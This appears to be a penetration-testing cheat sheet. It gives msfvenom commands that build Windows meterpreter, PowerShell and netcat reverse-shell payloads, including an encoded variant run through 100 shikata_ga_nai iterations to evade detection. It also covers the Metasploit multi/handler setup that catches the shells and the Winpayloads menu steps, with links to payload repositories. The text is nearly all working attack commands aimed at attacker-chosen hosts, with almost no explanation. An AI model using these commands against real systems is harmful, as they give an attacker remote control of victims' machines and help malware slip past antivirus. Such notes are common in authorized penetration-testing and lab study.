### [Payload Resources]
https://github.com/nccgroup/Winpayloads

Winpayloads.py

stager
r
ps payload
execute payload on target
#handler gets hit
\
clients
clientid#
\
back (to main menu)
2 to reverse tcp
y to upload
clientid#
\
#msfloads
sessions -i sesid#
shell
background (leave process in background)
sessions -k sesid#
\
clients
exit (kills client session)

https://github.com/xephora/PayloadsAllTheThings

[Generating Payloads on Windows using Metasploit]

### [Regular Reverse TCP]
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOURIP LPORT=YOURPORT -f exe > shell.exe
[Poly Morphic Reverse TCP]
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOURIP LPORT=YOURPORT -e x64/shikata_ga_nai -i 100 -f exe > file.exe

Creating a reverse tcp netcat comamnd
msfvenom -p cmd/unix/reverse_netcat lhost=<IP> lport=<port> R
```

### [Unique Reverse TCP]
```
msfvenom -p windows/powershell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > pshell.exe
```

### [Handler]
msf5 > use exploit/multi/handler

msf5 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

PAYLOAD => windows/x64/meterpreter/reverse_tcp

msf5 exploit(multi/handler) > set LHOST eth0

LHOST => tun0

msf5 exploit(multi/handler) > set LPORT 32119

LPORT => 32119

msf5 exploit(multi/handler) > run

https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom
https://www.offensive-security.com/metasploit-unleashed/fun-incognito/

